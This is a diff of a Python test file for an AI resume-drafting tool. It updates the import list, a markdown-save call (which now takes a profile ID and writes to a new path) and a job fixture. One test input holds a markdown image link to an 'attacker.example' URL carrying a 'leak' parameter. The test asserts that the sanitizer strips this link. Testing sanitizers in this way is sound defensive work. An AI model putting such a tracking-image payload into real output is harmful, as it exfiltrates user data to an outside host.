@@ -15,7 +15,7 @@ from sqlmodel import Session, SQLModel, create_engine
 from job_applier import drafts, pdf
 from job_applier.ai import bans, drafting, prompt_safety, providers, scoring, suggest
 from job_applier.config import settings
-from job_applier.models.db import FilterStatus, JobPosting, Resume
+from job_applier.models.db import JobPosting, Resume
 
 
 def _job(
@@ -159,8 +159,8 @@ def test_save_markdown_sanitizes_all_writers(tmp_path, monkeypatch):
         "# Name\n\n![x](https://attacker.example/p?d=leak)\n\n"
         "Summary with an em dash — and a [link](https://tracker.example/c)."
     )
-    drafts.save_markdown(42, evil, None)
-    saved = (tmp_path / "42" / "resume.md").read_text(encoding="utf-8")
+    drafts.save_markdown(42, evil, None, profile_id=1)
+    saved = (tmp_path / "profile-1" / "42" / "resume.md").read_text(encoding="utf-8")
     assert "attacker.example" not in saved  # tracking image removed
     assert "—" not in saved  # char ban applied on the manual path too
     assert "](" not in saved  # link flattened to plain text
@@ -220,7 +220,6 @@ def _seed_for_draft(session):
         company_name="Acme",
         description="We use TypeScript.",
         dedupe_hash="h-1",
-        filter_status=FilterStatus.passed,
     )
     session.add(job)
     session.commit()
